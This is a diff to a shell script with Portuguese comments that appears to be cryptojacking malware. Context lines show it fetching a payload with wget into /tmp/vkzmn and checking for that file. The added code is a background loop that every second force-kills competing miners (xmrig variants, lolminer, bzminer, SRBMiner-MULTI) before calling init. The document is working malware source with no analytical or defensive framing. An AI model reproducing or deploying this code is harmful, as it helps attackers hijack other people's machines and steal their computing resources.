@@ -41,9 +41,6 @@ echo  wget encontrado
 
 wget $url -O /tmp/vkzmn
 
-echo ultimo   erro do   wget ->  $?
-
-
 
 fi;
 
@@ -104,14 +101,9 @@ fi ;
 
 
 
-
-
-
-
-
 check_file() {
+
 vkzmn_in_tmp=0
-echo verificando se vkzmn  ja esta em /tmp
 ls /tmp/vkzmn  
 if (( $? )) ; then
 echo vkzmn nao esta em //tmp
@@ -125,6 +117,8 @@ magic
 fi;
 
 }
+
+
 
 
 
@@ -180,6 +174,7 @@ done
 
 ###############################
 pg() {
+
 vkzmn_ok=1
 pgrep=0
 command -v pgrep  
@@ -229,4 +224,88 @@ done
 }
 
 
-init
+
+
+
+ #kill  miners
+
+########################################
+
+
+my_kill() {
+
+
+#kill   xmrig1 xmrig2 xmrig3 xmrig4   lolminer  bzminer  SRBMiner-MULTI 
+
+
+while true ; do
+
+sleep    1
+
+
+
+
+pgrep=0
+
+command -v  pgrep
+
+if (( $? )) ; then 
+
+echo pgrep  nao ta instalado 
+
+else 
+
+pgrep=1
+
+fi;
+
+if (( $pgrep )) ; then
+
+
+pid=$(pgrep  xmrig)
+if (( $pid )) ; then
+kill -9 $pid 
+fi;
+
+pid2=$(pgrep xmrig1)
+if (( $pid2 )) ; then
+kill -9 $pid2
+fi;
+
+pid3=$(pgrep  xmrig2 )
+if (( $pid3 )) ; then
+kill -9 $pid3
+fi;
+
+pid4=$(pgrep xmrig3)
+if (( $pid4 )) ; then
+kill -9  $pid4
+fi;
+
+pid4=$(pgrep lolminer)
+if (( $pid4 )) ; then
+kill -9  $pid4
+fi;
+
+pid4=$(pgrep bzminer)
+if (( $pid4 )) ; then
+kill -9  $pid4
+fi;
+
+pid4=$(pgrep  SRBMiner-MULTI)
+if (( $pid4 )) ; then
+kill -9  $pid4
+fi;
+
+
+fi;
+
+done
+
+}
+
+
+ 
+my_kill &
+ 
+ init 
